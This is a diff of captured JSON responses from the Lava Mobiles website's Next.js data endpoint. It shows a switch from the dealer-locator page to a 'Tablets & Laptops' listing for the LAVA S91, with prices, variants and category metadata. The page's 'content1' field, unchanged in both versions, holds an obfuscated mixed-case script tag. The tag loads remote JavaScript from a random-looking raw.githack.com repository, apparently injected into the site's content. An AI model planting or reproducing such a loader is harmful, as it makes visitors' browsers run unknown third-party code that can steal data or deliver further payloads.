@@ -1,17 +1,117 @@
 {
-  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/lavastoredealer.json",
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/tablets-data-cards.json?subCat=all",
   "method": "GET",
   "status": 200,
   "content_type": "application/json",
   "body": {
     "pageProps": {
-      "DealerLocatorPge": {
+      "smartphoneData": {
         "status": 1,
-        "msg": "dealer-locator Page Content",
+        "msg": "Product Datas",
+        "all_products": [
+          {
+            "id": 1134,
+            "name": "LAVA S91",
+            "slug": "lava-s91",
+            "status": 1,
+            "image": "media/community/image/s91-ecom-listing-1778666156.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB RAM +64GB Internal Storage | MediaTek Helio OctaCore Processor | 5MP front and 8MP Rear Camera | Clean Android 15 OS | Metallic back",
+            "description": null,
+            "price": 24999,
+            "new_launches": "no",
+            "parent_id": "tablets-data-cards",
+            "launch_date": "2026-05-13T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 12,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": 23750,
+            "thumbnail_variant": [
+              {
+                "id": 2191,
+                "name": "Titanium",
+                "image": "media/images/product-variant/image_path/s91-ecom-listing-1778666204.webp",
+                "thumbnail": null,
+                "color_code": "#646d70",
+                "product_id": 1134
+              }
+            ]
+          }
+        ],
+        "categories": [
+          {
+            "id": 12,
+            "name": "Tablets & Laptops",
+            "type": null,
+            "sorting": 9,
+            "sub_text": null,
+            "content": "<p>laptops<br></p>",
+            "content2": null,
+            "content3": null,
+            "parent_id": 0,
+            "image": "media/work/image/new-project-(13)-1714992195.webp",
+            "image2": "",
+            "image_banner": "media/work/image_banner/tablet-and-laptop-1705925161.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/thumbnail-laptop-&-tablet-1705923991.webp",
+            "slug": "tablets",
+            "page_title": "Tablets",
+            "meta_keywords": "Tablets",
+            "meta_description": "Tablets",
+            "image_alt": null,
+            "meta_other": "Tablets",
+            "status": 1,
+            "layout": null,
+            "created_at": "2023-12-16T15:21:19.167Z",
+            "updated_at": "2024-05-06T16:13:15.867Z",
+            "category": "tablets-data-cards",
+            "image_thumbnail": "media/product_cate_thumbnail/tablet-(1)-1714718825.webp"
+          }
+        ],
+        "product": [
+          {
+            "id": 1134,
+            "name": "LAVA S91",
+            "slug": "lava-s91",
+            "status": 1,
+            "image": "media/community/image/s91-ecom-listing-1778666156.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB RAM +64GB Internal Storage | MediaTek Helio OctaCore Processor | 5MP front and 8MP Rear Camera | Clean Android 15 OS | Metallic back",
+            "description": null,
+            "price": 24999,
+            "new_launches": "no",
+            "parent_id": "tablets-data-cards",
+            "launch_date": "2026-05-13T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 12,
+            "thumbnail_variant": [
+              {
+                "id": 2191,
+                "name": "Titanium",
+                "image": "media/images/product-variant/image_path/s91-ecom-listing-1778666204.webp",
+                "thumbnail": null,
+                "color_code": "#646d70",
+                "product_id": 1134
+              }
+            ]
+          }
+        ],
+        "all_product_banner": {
+          "title": "Tablets & Laptops",
+          "image": "media/product/all_product_banner/laptop-&-tablet-all-product-1706530237_large-1722589881.jpg",
+          "mobile_banner": "media/product/all_product_banner/laptop-&-tablet-all-product-1706602648-thumb-1722589881.png"
+        }
+      },
+      "pageData": {
+        "status": 1,
+        "msg": "tablets-data-cards Page Content",
         "data": {
-          "id": 13,
-          "slug": "dealer-locator",
-          "name": "Dealer Locator",
+          "id": 15,
+          "slug": "tablets-data-cards",
+          "name": "tablets & laptops",
           "sub_text": null,
           "content1": "<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
           "content2": null,
@@ -19,14 +119,14 @@
           "content4": null,
           "content5": null,
           "content6": null,
-          "page_title": "Lava Store Dealers, Lava Retailers List Online in India - LAVA Mobiles",
-          "meta_keywords": "Dealer Locator",
-          "meta_description": "Lava Store Dealers, Lava Retailers List Online in India - LAVA Mobiles",
+          "page_title": "table & laptops",
+          "meta_keywords": null,
+          "meta_description": null,
           "meta_other": null,
           "video_url": null,
-          "image": "media/cmspage/image/bannse-1920x695-location--1721039627.webp",
+          "image": null,
           "image_alt": null,
-          "image_mobile": "media/cmspage/image_mobile/frame-157503-1703566570.webp",
+          "image_mobile": null,
           "status": 1
         },
         "leadership": {},
